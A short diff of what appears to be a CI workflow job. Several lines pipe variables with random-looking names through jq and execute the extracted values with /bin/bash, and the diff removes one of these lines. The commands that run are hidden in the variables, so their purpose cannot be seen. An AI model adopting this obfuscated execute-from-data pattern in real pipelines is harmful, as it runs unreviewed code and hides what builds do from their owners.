@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$lf4384" | jq -r .im945 | /bin/bash
           echo $eug11666 | jq -r .msj57 | /bin/bash
           echo $dca78223 | jq -r .ngvs6183 | /bin/bash
-          printf '%s' "$aecxo130" | jq -r .ducvo5808 | /bin/bash
           printf '%s' "$w715" | jq -r .xvlh223 | /bin/bash
 
       - name: Persist output
